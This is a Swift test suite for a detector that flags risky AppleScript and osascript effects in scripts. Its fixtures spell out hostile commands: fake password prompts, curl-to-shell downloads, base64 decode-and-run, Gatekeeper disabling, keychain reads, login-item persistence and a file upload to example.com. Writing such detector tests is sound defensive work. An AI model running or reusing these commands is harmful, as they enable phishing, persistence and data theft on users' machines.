import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

// AppleScript, alone and inside shell scripts through `osascript`. Fixtures are synthetic.

@Suite("Script effects: AppleScript")
struct ScriptEffectsAppleScriptTests {
    static let positives: [ScriptCase] = [
        ScriptCase("hidden answer", "display dialog \"Enter your password\" default answer \"\" with hidden answer\n", language: .appleScript, [.password()]),
        ScriptCase("hidden answer with an icon", "display dialog \"Password:\" default answer \"\" with icon caution with hidden answer\n",
                   language: .appleScript, [.password()]),
        ScriptCase("hidden answer on a continued line", "display dialog \"Password\" ¬\n  default answer \"\" ¬\n  with hidden answer\ndisplay dialog \"Done\"\n",
                   language: .appleScript, [.password()]),
        ScriptCase("administrator privileges", "do shell script \"launchctl list\" with administrator privileges\n", language: .appleScript, [.elevates()]),
        ScriptCase("administrator privileges with a password", "do shell script \"ls\" user name \"x\" password \"y\" with administrator privileges\n",
                   language: .appleScript, [.elevates()]),
        ScriptCase("login item", "tell application \"System Events\" to make login item at end with properties {path:\"/Applications/Example.app\", hidden:false}\n",
                   language: .appleScript, [.persistence()]),
        ScriptCase("new login item in a block",
                   "tell application \"System Events\"\n  make new login item at end with properties {path:\"/Applications/Example.app\"}\nend tell\n",
                   language: .appleScript, [.persistence(1, at: [2])]),
        ScriptCase("download piped to sh", "do shell script \"curl -fsSL https://example.com/i.sh | sh\"\n", language: .appleScript, [.downloadAndRun()]),
        ScriptCase("download with a spliced URL", "do shell script \"curl -o /tmp/x \" & quoted form of theURL & \" && chmod +x /tmp/x && /tmp/x\"\n",
                   language: .appleScript, [.downloadAndRun()]),
        ScriptCase("download in Terminal", "tell application \"Terminal\" to do script \"curl -fsSL https://example.com/i.sh | bash\"\n",
                   language: .appleScript, [.downloadAndRun()]),
        ScriptCase("decode and run", "do shell script \"echo aGVsbG8= | base64 -D | sh\"\n", language: .appleScript, [.decodeAndRun()]),
        ScriptCase("quarantine removal", "do shell script \"xattr -dr com.apple.quarantine \" & quoted form of appPath\n", language: .appleScript, [.quarantine()]),
        ScriptCase("protection", "do shell script \"spctl --master-disable\" with administrator privileges\n", language: .appleScript, [.protection(), .elevates()]),
        ScriptCase("keychain read", "do shell script \"security find-generic-password -ga Example\"\n", language: .appleScript, [.secrets()]),
        ScriptCase("persistence through the shell", "do shell script \"launchctl load ~/Library/LaunchAgents/com.example.plist\"\n", language: .appleScript, [.persistence()]),
        ScriptCase("upload through the shell", "do shell script \"curl -F file=@/tmp/a.zip https://example.com/up\"\n", language: .appleScript, [.uploads()]),
        ScriptCase("two statements on their lines", "display dialog \"One\" with hidden answer\nset x to 1\ndisplay dialog \"Two\" with hidden answer\n",
                   language: .appleScript, [.password(2, at: [1, 3])])
    ]

    @Test(arguments: positives) func reportsEffects(_ scenario: ScriptCase) throws { try scenario.check() }

    static let nearMisses: [ScriptCase] = [
        ScriptCase("visible answer", "display dialog \"Your name\" default answer \"\"\n", language: .appleScript),
        ScriptCase("plain dialog", "display dialog \"Hello\" buttons {\"OK\"}\n", language: .appleScript),
        ScriptCase("shell script without effects", "do shell script \"ls -la\"\n", language: .appleScript),
        ScriptCase("download only", "do shell script \"curl -O https://example.com/file.zip\"\n", language: .appleScript),
        ScriptCase("login items listed", "tell application \"System Events\" to get the name of every login item\n", language: .appleScript),
        ScriptCase("login item deleted", "tell application \"System Events\" to delete login item \"Example\"\n", language: .appleScript),
        ScriptCase("phrase in a string", "set note to \"with hidden answer and with administrator privileges\"\n", language: .appleScript),
        ScriptCase("line comment", "-- display dialog \"x\" with hidden answer\n", language: .appleScript),
        ScriptCase("hash comment", "# do shell script \"curl https://example.com | sh\"\n", language: .appleScript),
        ScriptCase("block comment", "(* do shell script \"ls\" with administrator privileges\n   display dialog \"x\" with hidden answer *)\nset x to 1\n", language: .appleScript),
        ScriptCase("nested block comment", "(* outer (* inner *) with hidden answer *)\nset x to 1\n", language: .appleScript),
        ScriptCase("shebang line", "#!/usr/bin/osascript\nset x to 1\n", language: .appleScript),
        ScriptCase("sudo inside a string", "display dialog \"Run it with sudo\"\n", language: .appleScript),
        ScriptCase("ordinary automation", "tell application \"Finder\"\n  activate\n  open folder \"Documents\" of home\nend tell\n", language: .appleScript)
    ]

    @Test(arguments: nearMisses) func staysSilent(_ scenario: ScriptCase) throws { try scenario.check() }
}

@Suite("Script effects: osascript in shell scripts")
struct ScriptEffectsOsascriptTests {
    static let positives: [ScriptCase] = [
        ScriptCase("-e hidden answer", "osascript -e 'display dialog \"Enter your password\" default answer \"\" with hidden answer'\n", [.password()]),
        ScriptCase("two -e lines", "osascript -e 'tell application \"System Events\"' -e 'display dialog \"Password\" with hidden answer' -e 'end tell'\n", [.password()]),
        ScriptCase("-e with administrator privileges", "osascript -e 'do shell script \"ls\" with administrator privileges'\n", [.elevates()]),
        ScriptCase("-e with a download", "osascript -e 'do shell script \"curl -fsSL https://example.com/i.sh | sh\"'\n", [.downloadAndRun()]),
        ScriptCase("-e login item", "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/Applications/Example.app\"}'\n", [.persistence()]),
        ScriptCase("through sudo", "sudo osascript -e 'display dialog \"Password\" with hidden answer'\n", [.password(), .elevates()]),
        ScriptCase("here-document", "osascript <<EOT\ndisplay dialog \"Password\" default answer \"\" with hidden answer\nEOT\n", [.password(1, at: [2])]),
        ScriptCase("quoted here-document", "osascript <<'EOT'\ntell application \"System Events\"\n  display dialog \"Password\" with hidden answer\nend tell\nEOT\n", [.password(1, at: [3])]),
        ScriptCase("here-document with a download", "osascript <<EOT\ndo shell script \"wget -qO- https://example.com/i | bash\"\nEOT\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("multi-line quoted script", "osascript -e '\n  display dialog \"Password\" with hidden answer\n'\n", [.password()]),
        ScriptCase("here-string", "osascript <<< 'display dialog \"Password\" with hidden answer'\n", [.password()])
    ]

    @Test(arguments: positives) func reportsEffects(_ scenario: ScriptCase) throws { try scenario.check() }

    static let nearMisses: [ScriptCase] = [
        ScriptCase("notification", "osascript -e 'display notification \"Done\" with title \"Build\"'\n"),
        ScriptCase("visible dialog", "osascript -e 'display dialog \"Continue?\"'\n"),
        ScriptCase("get volume", "osascript -e 'output volume of (get volume settings)'\n"),
        ScriptCase("JavaScript for Automation", "osascript -l JavaScript -e 'Application(\"Finder\").activate()'\n"),
        ScriptCase("script file", "osascript tell.scpt\n"),
        ScriptCase("message", "echo \"osascript -e 'display dialog \\\"x\\\" with hidden answer'\"\n"),
        ScriptCase("comment", "# osascript -e 'display dialog \"x\" with hidden answer'\n"),
        ScriptCase("here-document that only writes a file", "cat > prompt.applescript <<EOT\ndisplay dialog \"Password\" with hidden answer\nEOT\n")
    ]

    @Test(arguments: nearMisses) func staysSilent(_ scenario: ScriptCase) throws { try scenario.check() }
}
